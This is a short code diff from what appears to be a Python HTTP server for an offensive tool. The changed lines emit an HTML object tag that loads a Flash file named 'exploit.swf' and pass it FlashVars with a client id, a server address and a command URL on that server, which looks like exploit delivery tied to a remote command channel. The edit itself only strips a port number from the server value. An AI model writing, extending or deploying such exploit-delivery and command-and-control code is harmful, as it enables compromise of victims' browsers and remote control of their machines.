@@ -94,7 +94,7 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 				result ="""<object width="1" height="1" data="exploit.swf" type="application/x-shockwave-flash" class="myclass" id="myid">
 						<param value="transparent" name="wmode">
 						<param value="allways" name="allowScriptAccess">
-						<param value="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli" name="FlashVars">
+						<param value="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2].split(":")[0]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli" name="FlashVars">
 					</object>
 			"""
 		elif cmd=="LIST":
